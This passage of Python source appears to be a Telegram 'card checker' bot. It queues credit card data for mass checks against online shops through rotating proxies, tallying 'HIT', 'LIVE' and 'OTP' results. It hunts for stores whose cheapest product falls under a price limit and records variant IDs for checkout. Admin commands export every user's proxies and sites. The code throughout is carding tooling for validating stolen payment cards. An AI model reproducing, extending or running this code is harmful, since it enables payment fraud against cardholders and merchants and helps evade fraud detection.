    task_users[msg_id] = user.id
    
    # Add cards to queue
    for i, (card_str, cc_parts) in enumerate(valid_cards):
        proxy = random.choice(user_proxies) if user_proxies else None
        site = sites[i]
        task_id = f"{user.id}_{int(time.time())}_{i}"
        active_tasks[task_id] = {
            'user_id': user.id,
            'task_type': 'mchk',
            'status': 'queued',
            'site': site,
            'created_at': datetime.utcnow()
        }
        
        await TASK_QUEUE.put({
            'user_id': user.id,
            'cc_data': cc_parts,
            'site': site,
            'proxy': proxy,
            'message': processing_msg,
            'type': 'mchk',
            'task_id': task_id
        })
        
        await increment_user_checks(user.id)

@app.on_message(filters.command('chksite') & filters.private)
async def chksite_command(client, message):
    """Test sites and find working ones"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    # Get sites from command or reply
    sites = []
    if len(message.command) > 1:
        sites_text = ' '.join(message.command[1:])
        sites = [line.strip() for line in sites_text.split('\n') if line.strip()]
    elif message.reply_to_message:
        if message.reply_to_message.document:
            # Handle file upload
            file = await message.reply_to_message.download()
            async with aiofiles.open(file, 'r') as f:
                content = await f.read()
                sites = [line.strip() for line in content.split('\n') if line.strip()]
            os.remove(file)
        elif message.reply_to_message.text:
            # Handle text reply
            sites = [line.strip() for line in message.reply_to_message.text.split('\n') if line.strip()]
    
    if not sites:
        await message.reply_text(
            "❌ Please provide sites to test (one per line)\n"
            "Example: myshop.com or https://myshop.com",
            disable_web_page_preview=True
        )
        return
    
    sites = sites
    
    # Get user's proxy
    user_proxies = await get_user_proxies(user.id)
    proxy = random.choice(user_proxies) if user_proxies else None
    
    # Create progress message
    progress_text = f"""TASK
USER: {user.first_name}
START TIME: {datetime.now().strftime('%H:%M:%S')}
ELAPSED: 0:00:00

CREATED BY @still_alivenow"""

    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"TOTAL {len(sites)}", callback_data="ignore"),
            InlineKeyboardButton(f"CHECKED 0", callback_data="ignore")
        ],
        [
            InlineKeyboardButton(f"HIT 0", callback_data="ignore"),
            InlineKeyboardButton(f"LIVE 0", callback_data="ignore")
        ],
        [
            InlineKeyboardButton(f"OTP 0", callback_data="ignore"),
            InlineKeyboardButton(f"FAILED 0", callback_data="ignore")
        ]
    ])
    
    processing_msg = await message.reply_text(
        text=progress_text,
        reply_markup=keyboard,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )
    
    # Store task info
    msg_id = processing_msg.id
    task_stats[msg_id] = {
        'total': len(sites),
        'checked': 0,
        'hit': 0,
        'live': 0,
        'otp': 0,
        'failed': 0,
        'start_time': datetime.now()
    }
    task_messages[msg_id] = processing_msg
    task_users[msg_id] = user.id
    
    # Test sites
    working_sites = []
    skipped_sites = []
    dead_sites = []
    
    for i, site in enumerate(sites):
        # Update progress
        is_working, message_text, product_info = await test_site_connection(site, proxy)
        
        if is_working:
            saved, save_msg = await save_working_site(user.id, site, product_info)
            if saved:
                working_sites.append((site, product_info))
                hit_status = "hit"
            else:
                skipped_sites.append((site, product_info, save_msg))
                hit_status = "failed"
        else:
            dead_sites.append((site, message_text))
            hit_status = "failed"
        
        # Update stats
        task_stats[msg_id]['checked'] = i + 1
        if hit_status == 'hit':
            task_stats[msg_id]['hit'] += 1
        else:
            task_stats[msg_id]['failed'] += 1
        
        # Update progress message
        await update_task_progress(msg_id, task_stats[msg_id])
    
    # Create result file
    result_file = f"site_test_{user.id}.txt"
    async with aiofiles.open(result_file, 'w') as f:
        await f.write("=== WORKING SITES ===\n\n")
        for site, info in working_sites:
            await f.write(f"{site}\n")
            await f.write(f"  Price: ${info['price']}\n")
            await f.write(f"  Product: {info['link']}\n\n")

        await f.write("\n=== SKIPPED SITES (PRICE LIMIT) ===\n\n")
        for site, info, reason in skipped_sites:
            await f.write(f"{site}\n")
            await f.write(f"  Price: ${info.get('price', 'N/A')}\n")
            await f.write(f"  Reason: {reason}\n\n")
        
        await f.write("\n=== DEAD SITES ===\n\n")
        for site, error in dead_sites:
            await f.write(f"{site} - {error}\n")
    
    # Send results
    summary = f"""✅ Site Test Complete!

📊 Results:
🟢 Added: {len(working_sites)}
🟡 Skipped (> ${MAX_SITE_PRODUCT_PRICE:.2f}): {len(skipped_sites)}
🔴 Dead: {len(dead_sites)}

Only sites under ${MAX_SITE_PRODUCT_PRICE:.2f} were added.
Check /showsites to see them."""
    
    await message.reply_document(
        result_file,
        caption=summary
    )
    
    os.remove(result_file)
    
    # Clean up task data
    asyncio.create_task(cleanup_task_data(msg_id))

@app.on_message(filters.command('addproxy') & filters.private)
async def addproxy_command(client, message):
    """Add proxy command"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    # Get proxies from command or reply
    proxies = []
    if len(message.command) > 1:
        proxies_text = ' '.join(message.command[1:])
        proxies = [line.strip() for line in proxies_text.split('\n') if line.strip()]
    elif message.reply_to_message:
        if message.reply_to_message.document:
            file = await message.reply_to_message.download()
            async with aiofiles.open(file, 'r') as f:
                content = await f.read()
                proxies = [line.strip() for line in content.split('\n') if line.strip()]
            os.remove(file)
        elif message.reply_to_message.text:
            proxies = [line.strip() for line in message.reply_to_message.text.split('\n') if line.strip()]
    
    if not proxies:
        await message.reply_text(
            "❌ Please provide proxies (one per line)\n"
            "Format: IP:PORT or IP:PORT:USER:PASS",
            disable_web_page_preview=True
        )
        return
    
    status_msg = await message.reply_text(
        f"🔄 Validating {len(proxies)} proxies...",
        disable_web_page_preview=True
    )

    normalized_proxies = []
    invalid_proxies = []
    seen = set()
    for proxy in proxies:
        is_valid, normalized_proxy, reason = validate_proxy_format(proxy)
        if not is_valid:
            invalid_proxies.append((proxy, reason))
            continue
        if normalized_proxy in seen:
            continue
        seen.add(normalized_proxy)
        normalized_proxies.append(normalized_proxy)

    if not normalized_proxies:
        await status_msg.edit_text(
            f"❌ No valid proxies found.\n"
            f"Invalid format: {len(invalid_proxies)}",
            disable_web_page_preview=True
        )
        return

    semaphore = asyncio.Semaphore(PROXY_VALIDATION_CONCURRENCY)

    async def _validate_one(proxy_value):
        async with semaphore:
            ok, reason = await validate_proxy_connection(proxy_value)
            return proxy_value, ok, reason

    proxy_checks = await asyncio.gather(*[_validate_one(proxy_value) for proxy_value in normalized_proxies])

    added = 0
    db_failed = 0
    unreachable = []
    for proxy_value, ok, reason in proxy_checks:
        if not ok:
            unreachable.append((proxy_value, reason))
            continue
        if await add_user_proxy(user.id, proxy_value):
            added += 1
        else:
            db_failed += 1

    details = [
        "✅ Proxy validation complete!",
        f"📊 Added: {added}",
        f"❌ Invalid format: {len(invalid_proxies)}",
        f"❌ Unreachable: {len(unreachable)}",
        f"❌ DB failed: {db_failed}"
    ]
    if invalid_proxies:
        details.append(f"⚠️ Invalid sample: {invalid_proxies[0][0]} ({invalid_proxies[0][1]})")
    if unreachable:
        details.append(f"⚠️ Unreachable sample: {unreachable[0][0]} ({unreachable[0][1]})")

    await status_msg.edit_text("\n".join(details), disable_web_page_preview=True)

@app.on_message(filters.command('delproxy') & filters.private)
async def delproxy_command(client, message):
    """Delete proxy command"""
    user = message.from_user
    
    if len(message.command) > 1:
        # Delete specific proxy
        proxy = message.command[1]
        if await delete_user_proxy(user.id, proxy):
            await message.reply_text(f"✅ Proxy deleted: {proxy}", disable_web_page_preview=True)
        else:
            await message.reply_text("❌ Proxy not found", disable_web_page_preview=True)
    else:
        # Delete all proxies
        if await delete_user_proxy(user.id):
            await message.reply_text("✅ All your proxies deleted", disable_web_page_preview=True)
        else:
            await message.reply_text("❌ No proxies found", disable_web_page_preview=True)

@app.on_message(filters.command('showproxy') & filters.private)
async def showproxy_command(client, message):
    """Show user's proxies"""
    user = message.from_user
    
    proxies = await get_user_proxies(user.id)
    
    if not proxies:
        await message.reply_text("❌ You have no saved proxies", disable_web_page_preview=True)
        return
    
    # Create proxy list text
    proxy_text = "📋 Your Proxies:\n\n"
    for i, proxy in enumerate(proxies, 1):
        proxy_text += f"{i}. {proxy}\n"
    
    # Send as file if too long
    if len(proxy_text) > 4000:
        file_path = f"proxies_{user.id}.txt"
        async with aiofiles.open(file_path, 'w') as f:
            await f.write('\n'.join(proxies))
        await message.reply_document(file_path, caption=f"📋 Your Proxies ({len(proxies)})", disable_web_page_preview=True)
        os.remove(file_path)
    else:
        await message.reply_text(proxy_text, disable_web_page_preview=True)

@app.on_message(filters.command('addsite') & filters.private)
async def addsite_command(client, message):
    """Check site and get cheapest product"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    # Get site from command
    if len(message.command) > 1:
        site = message.command[1]
    else:
        await message.reply_text("❌ Please provide a site URL", disable_web_page_preview=True)
        return
    
    # Get user's proxy
    user_proxies = await get_user_proxies(user.id)
    proxy = random.choice(user_proxies) if user_proxies else None
    
    # Send processing message
    processing_msg = await message.reply_text(f"🔄 Checking site: {site}...", disable_web_page_preview=True)
    
    # Fetch products
    info = await fetch_products(site, proxy)
    
    if isinstance(info, tuple) and info[0] is False:
        await processing_msg.edit_text(f"❌ {info[1]}", disable_web_page_preview=True)
        return
    
    # Save working site (only if cheapest product <= price limit)
    success, msg = await save_working_site(user.id, site, info)
    
    if success:
        # Format response
        response = f"""✅ Site Check Result

🌐 Site: {site}
💰 Cheapest Product: ${info['price']}
🔗 Link: {info['link']}
🆔 Variant ID: {info['variant_id']}

✅ Site added to your working sites!"""
    else:
        response = f"""✅ Site Check Result

🌐 Site: {site}
💰 Cheapest Product: ${info['price']}
🔗 Link: {info['link']}
🆔 Variant ID: {info['variant_id']}

⚠️ {msg}"""

    await processing_msg.edit_text(response, disable_web_page_preview=True)

@app.on_message(filters.command('showsites') & filters.private)
async def showsites_command(client, message):
    """Show all your working sites"""
    user = message.from_user
    
    # Get user's sites
    user_sites_doc = await user_sites_col.find_one({'user_id': user.id})
    
    if not user_sites_doc or 'sites' not in user_sites_doc or not user_sites_doc['sites']:
        await message.reply_text("❌ You don't have any saved sites yet.\nUse /addsite to add working sites first.", disable_web_page_preview=True)
        return
    
    sites_list = user_sites_doc['sites']
    
    # Create a formatted list of sites
    sites_text = "📋 Your Working Sites:\n\n"
    total_price = 0
    price_count = 0
    
    for i, site_entry in enumerate(sites_list, 1):
        if isinstance(site_entry, dict):
            site_url = site_entry.get('url', 'Unknown')
            price = site_entry.get('price', 'N/A')
            if price != 'N/A':
                try:
                    total_price += float(price)
                    price_count += 1
                except:
                    pass
            sites_text += f"{i}. {site_url} - ${price}\n"
        else:
            sites_text += f"{i}. {site_entry}\n"
    
    if price_count > 0:
        avg_price = total_price / price_count
        sites_text += f"\n📊 Statistics:\n"
        sites_text += f"Total Sites: {len(sites_list)}\n"
        sites_text += f"Avg Price: ${avg_price:.2f}\n"
    
    sites_text += f"\nTo remove sites, use:\n"
    sites_text += "`/rmvsite` - Show removal options"
    
    # If list is too long, send as file
    if len(sites_text) > 4000:
        file_path = f"sites_{user.id}.txt"
        async with aiofiles.open(file_path, 'w') as f:
            for site_entry in sites_list:
                if isinstance(site_entry, dict):
                    await f.write(f"{site_entry.get('url', 'Unknown')} - ${site_entry.get('price', 'N/A')}\n")
                else:
                    await f.write(f"{site_entry}\n")
        await message.reply_document(
            file_path,
            caption=f"📋 Your Working Sites ({len(sites_list)} sites)",
            disable_web_page_preview=True
        )
        os.remove(file_path)
    else:
        await message.reply_text(sites_text, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)

@app.on_message(filters.command('rmvsite') & filters.private)
async def rmvsite_command(client, message):
    """User command: Remove your own sites"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    # Parse command arguments
    args = message.text.split()
    
    # Get user's sites first
    user_sites_doc = await user_sites_col.find_one({'user_id': user.id})
    
    if not user_sites_doc or 'sites' not in user_sites_doc or not user_sites_doc['sites']:
        await message.reply_text("❌ You don't have any saved sites yet.\nUse /addsite to add working sites first.", disable_web_page_preview=True)
        return
    
    # If no site specified, show list of sites with numbers
    if len(args) < 2:
        sites_list = user_sites_doc['sites']
        
        # Create a numbered list of sites
        sites_text = "📋 Your Working Sites:\n\n"
        for i, site_entry in enumerate(sites_list, 1):
            if isinstance(site_entry, dict):
                site_url = site_entry.get('url', 'Unknown')
                price = site_entry.get('price', 'N/A')
                sites_text += f"{i}. {site_url} (${price})\n"
            else:
                sites_text += f"{i}. {site_entry}\n"
        
        sites_text += f"\nTotal: {len(sites_list)} sites\n\n"
        sites_text += "**How to remove:**\n"
        sites_text += "`/rmvsite all` - Remove ALL your sites\n"
        sites_text += "`/rmvsite <number>` - Remove site by number\n"
        sites_text += "`/rmvsite <site_url>` - Remove site by URL"
        
        await message.reply_text(sites_text, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
        return
    
    # Handle different removal methods
    removal_input = args[1].lower()
    
    # Case 1: Remove all sites
    if removal_input == 'all':
        # Delete all sites immediately
        result = await user_sites_col.delete_one({'user_id': user.id})
        
        if result.deleted_count > 0:
            await message.reply_text("✅ All your working sites have been removed successfully!", disable_web_page_preview=True)
        else:
            await message.reply_text("❌ Failed to remove sites or no sites found.", disable_web_page_preview=True)
        
        return
    
    # Case 2: Remove by number
    if removal_input.isdigit():
        site_number = int(removal_input) - 1
        sites_list = user_sites_doc['sites']
        
        if 0 <= site_number < len(sites_list):
            site_to_remove = sites_list[site_number]
            
            if isinstance(site_to_remove, dict):
                site_url = site_to_remove.get('url')
                site_price = site_to_remove.get('price', 'N/A')
            else:
                site_url = site_to_remove
            
            # Remove the site
            result = await user_sites_col.update_one(
                {'user_id': user.id},
                {'$pull': {'sites': site_to_remove}}
            )
            
            if result.modified_count > 0:
                await message.reply_text(
                    f"✅ Site removed successfully!\n\n"
                    f"Removed: {site_url if isinstance(site_url, str) else 'Unknown'}\n"
                    f"Price: ${site_price if 'site_price' in locals() else 'N/A'}",
                    disable_web_page_preview=True
                )
            else:
                await message.reply_text("❌ Failed to remove site.", disable_web_page_preview=True)
        else:
            await message.reply_text(f"❌ Invalid site number. Please use a number between 1 and {len(sites_list)}", disable_web_page_preview=True)
        
        return
    
    # Case 3: Remove by URL (partial or full)
    else:
        search_term = removal_input.lower()
        sites_list = user_sites_doc['sites']
        
        # Find matching sites
        matching_sites = []
        for site_entry in sites_list:
            if isinstance(site_entry, dict):
                site_url = site_entry.get('url', '').lower()
            else:
                site_url = str(site_entry).lower()
            
            if search_term in site_url:
                matching_sites.append(site_entry)
        
        if not matching_sites:
            await message.reply_text(f"❌ No sites found matching '{removal_input}'", disable_web_page_preview=True)
            return
        
        if len(matching_sites) == 1:
            # Single match - remove it directly
            site_to_remove = matching_sites[0]
            
            result = await user_sites_col.update_one(
                {'user_id': user.id},
                {'$pull': {'sites': site_to_remove}}
            )
            
            if result.modified_count > 0:
                site_name = site_to_remove.get('url', str(site_to_remove)) if isinstance(site_to_remove, dict) else str(site_to_remove)
                await message.reply_text(f"✅ Site removed: {site_name}", disable_web_page_preview=True)
            else:
                await message.reply_text("❌ Failed to remove site.", disable_web_page_preview=True)
        
        else:
            # Multiple matches - show them with numbers for selection
            sites_text = f"🔍 Found {len(matching_sites)} sites matching '{removal_input}':\n\n"
            
            for i, site_entry in enumerate(matching_sites, 1):
                if isinstance(site_entry, dict):
                    site_url = site_entry.get('url', 'Unknown')
                    price = site_entry.get('price', 'N/A')
                    sites_text += f"{i}. {site_url} (${price})\n"
                else:
                    sites_text += f"{i}. {site_entry}\n"
            
            sites_text += f"\nTo remove one, use the number:\n"
            sites_text += f"`/rmvsite {i}` (where {i} is the number above)\n"
            sites_text += f"Or use `/rmvsite all` to remove all"
            
            await message.reply_text(sites_text, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)

@app.on_message(filters.command('stats') & filters.private)
async def stats_command(client, message):
    """Show user statistics"""
    user = message.from_user
    
    stats = await get_user_stats(user.id)
    if not stats:
        await message.reply_text("❌ No stats found", disable_web_page_preview=True)
        return
    
    # Format stats
    joined_date = stats['joined_at'].strftime("%Y-%m-%d %H:%M") if stats['joined_at'] else "Unknown"
    last_seen = stats['last_seen'].strftime("%Y-%m-%d %H:%M") if stats['last_seen'] else "Unknown"
    
    stats_text = f"""📊 Your Statistics

👤 Name: {stats['first_name']}
🆔 User ID: {stats['user_id']}
📅 Joined: {joined_date}
👀 Last Seen: {last_seen}
🔢 Total Checks: {stats['total_checks']}
🔌 Proxies: {stats['proxy_count']}
🌐 Working Sites: {stats['sites_count']}
⚡ Active Tasks: {stats['active_tasks']} (Queued: {stats['active_queued']} | Processing: {stats['active_processing']})"""

    await message.reply_text(stats_text, disable_web_page_preview=True)

# Admin commands
@app.on_message(filters.command('leechproxy'))
async def leechproxy_command(client, message):
    """Admin: Get user proxies"""
    user = message.from_user
    
    # Check if user is admin
    if user.id not in ADMINS:
        await message.reply_text("❌ You are not authorized to use this command", disable_web_page_preview=True)
        return
    
    # Get user ID from command
    target_user_id = None
    if len(message.command) > 1:
        try:
            target_user_id = int(message.command[1])
        except ValueError:
            await message.reply_text("❌ Invalid user ID", disable_web_page_preview=True)
            return
    
    if target_user_id:
        # Get specific user's proxies
        proxies = await get_user_proxies(target_user_id)
        if not proxies:
            await message.reply_text(f"❌ No proxies found for user {target_user_id}", disable_web_page_preview=True)
            return
        
        # Create file
        file_path = f"proxies_{target_user_id}.txt"
        async with aiofiles.open(file_path, 'w') as f:
            await f.write('\n'.join(proxies))
        await message.reply_document(
            file_path,
            caption=f"📋 Proxies for user {target_user_id} ({len(proxies)})"
        )
        os.remove(file_path)
    else:
        # Get all users' proxies
        all_proxies = await get_all_proxies()
        if not all_proxies:
            await message.reply_text("❌ No proxies found in database", disable_web_page_preview=True)
            return
        
        # Group by user
        user_proxies = {}
        for p in all_proxies:
            uid = p['user_id']
            if uid not in user_proxies:
                user_proxies[uid] = []
            user_proxies[uid].append(p['proxy'])
        
        # Create file with all proxies
        file_path = "all_proxies.txt"
        async with aiofiles.open(file_path, 'w') as f:
            for uid, proxies in user_proxies.items():
                await f.write(f"User: {uid} ({len(proxies)} proxies)\n")
                for proxy in proxies:
                    await f.write(f"  {proxy}\n")
                await f.write("\n")
        
        await message.reply_document(
            file_path,
            caption=f"📋 All Proxies ({len(all_proxies)} total from {len(user_proxies)} users)"
        )
        os.remove(file_path)
        
@app.on_message(filters.command('getusersite'))
async def getusersite_command(client, message):
    """Admin: Get all user working sites"""
    user = message.from_user
    
    # Check if user is admin
    if user.id not in ADMINS:
        await message.reply_text("❌ You are not authorized to use this command", disable_web_page_preview=True)
        return
    
    # Get all user sites
    cursor = user_sites_col.find({})
    user_sites_list = await cursor.to_list(length=None)
    
    if not user_sites_list:
        await message.reply_text("❌ No user sites found", disable_web_page_preview=True)
        return
    
    # Create file with all user sites
    file_path = "user_sites.txt"
    async with aiofiles.open(file_path, 'w') as f:
        for user_sites in user_sites_list:
            uid = user_sites['user_id']
            sites = user_sites.get('sites', [])
            await f.write(f"User: {uid} ({len(sites)} sites)\n")
            for site in sites:
                if isinstance(site, dict):
                    await f.write(f"  {site['url']} - ${site.get('price', 'N/A')}\n")
                else:
                    await f.write(f"  {site}\n")
            await f.write("\n")
    
    await message.reply_document(
        file_path,
        caption=f"📋 All User Sites ({len(user_sites_list)} users)"
    )
    os.remove(file_path)


@app.on_message(filters.command('loadsite') & filters.private)
async def loadsite_command(client, message):
    """Admin: Add global sites"""
    user = message.from_user
    
    # Check if user is admin
    if user.id not in ADMINS:
        await message.reply_text("❌ You are not authorized to use this command", disable_web_page_preview=True)
        return
    
    # Get sites from command or reply
    sites = []
    if len(message.command) > 1:
        sites_text = ' '.join(message.command[1:])
        sites = [line.strip() for line in sites_text.split('\n') if line.strip()]
    elif message.reply_to_message:
        if message.reply_to_message.document:
            file = await message.reply_to_message.download()
            async with aiofiles.open(file, 'r') as f:
                content = await f.read()
                sites = [line.strip() for line in content.split('\n') if line.strip()]
            os.remove(file)
        elif message.reply_to_message.text:
            sites = [line.strip() for line in message.reply_to_message.text.split('\n') if line.strip()]
    
    if not sites:
        await message.reply_text("❌ Please provide sites (one per line)", disable_web_page_preview=True)
        return
    
    # Add sites
    added = 0
    failed = 0
    messages = []
    
    for site in sites:
        success, msg = await add_global_site(site)
        if success:
            added += 1
        else:
            failed += 1
            messages.append(msg)
    
    response = f"✅ Global sites added!\n📊 Added: {added}\n❌ Failed: {failed}"
    if messages:
        response += f"\n\n⚠️ Issues:\n" + "\n".join(messages[:5])
    
    await message.reply_text(response, disable_web_page_preview=True)

@app.on_message(filters.command('delsite') & filters.private)
async def delsite_command(client, message):
    """Admin: Delete global sites"""
    user = message.from_user
    
    # Check if user is admin
    if user.id not in ADMINS:
        await message.reply_text("❌ You are not authorized to use this command", disable_web_page_preview=True)
        return
    
    if len(message.command) > 1:
        # Delete specific site
        site = message.command[1]
        if await delete_global_site(site):
            await message.reply_text(f"✅ Global site deleted: {site}", disable_web_page_preview=True)
        else:
            await message.reply_text("❌ Site not found", disable_web_page_preview=True)
    else:
        # Delete all sites
        if await delete_global_site():
            await message.reply_text("✅ All global sites deleted", disable_web_page_preview=True)
        else:
            await message.reply_text("❌ No sites found", disable_web_page_preview=True)



# Error handler
@app.on_message()
async def error_handler(client, message):
    """Handle unknown commands"""
    if message.text and message.text.startswith('/'):
        await message.reply_text("❌ Unknown command. Use /start to see available commands.", disable_web_page_preview=True)

# Main function
async def main():
    """Main function to start the bot"""
    logger.info("Starting bot...")
    
    # Initialize database
    await init_db()
    
    # Start workers
    for i in range(WORKER_COUNT):
        task = asyncio.create_task(task_worker(i))
        active_workers.append(task)
    
    # Start result handler
    result_task = asyncio.create_task(result_handler())
    
    # Start bot
    await app.start()
    logger.info("Bot started successfully")
    
    # Keep running
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        logger.info("Stopping bot...")
    finally:
        # Stop workers
        for _ in range(WORKER_COUNT):
            await TASK_QUEUE.put(None)
        
        # Wait for workers to finish
        await asyncio.gather(*active_workers, return_exceptions=True)
        
        # Stop result handler
        result_task.cancel()
        
        # Stop bot
        await app.stop()
        logger.info("Bot stopped")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")